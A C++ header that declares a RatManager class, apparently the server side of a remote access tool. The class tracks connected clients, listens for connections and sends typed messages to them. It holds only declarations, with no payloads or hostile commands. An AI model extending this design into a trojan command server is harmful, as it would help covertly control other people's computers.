#pragma once

#include <vector>

#include "ClientPipe.h"
#include "ICommunicationFactory.h"
#include "IConnectionListener.h"
#include "IRatManager.h"
#include "ThreadGuard.h"

class RatManager final : public IRatManager
{
public:
	explicit RatManager(
		ICommunicationFactory* factory,
		std::unique_ptr<IConnectionListener> server);

	~RatManager() override;

	[[nodiscard]] int GetClientCount() const override;

	std::vector<std::shared_ptr<IClientPipe>> GetClients() override;

	[[nodiscard]] int Send(int client, MessageType type, std::span<char> content) const override;

	void Join() override;

private:
	void Listen();

	void OnDisconnection(int client);

	static void OnMessage(
		int client,
		MessageType type,
		std::span<char> content);

	ICommunicationFactory* _factory;
	std::unique_ptr<IConnectionListener> _server;
	std::vector<std::shared_ptr<IClientPipe>> _clients;
	std::unique_ptr<ThreadGuard> _listenThread;
	int _clientCount;
	bool _isTerminationRequested;
};

